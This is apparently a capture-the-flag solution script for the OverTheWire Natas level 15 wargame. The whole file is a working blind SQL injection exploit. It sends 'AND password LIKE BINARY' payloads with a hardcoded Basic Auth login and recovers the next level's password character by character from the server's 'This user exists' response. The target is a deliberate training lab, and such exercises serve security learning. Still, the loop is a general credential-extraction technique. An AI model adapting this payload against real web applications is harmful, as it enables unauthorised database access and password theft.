#!/usr/bin/env python
import requests

auth_user = 'natas15'
auth_pwd = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
target = "http://natas15.natas.labs.overthewire.org/?debug"

password = ''

for pos in range(33):
	for i in range(48,123):
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			sqli = {'username': 'natas16" AND password LIKE BINARY "%s%s%%' % (password, chr(i))}
			r = requests.post(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				data = sqli
				)
			if "This user exists" in r.text:
				password += chr(i)
				print(password)
				break
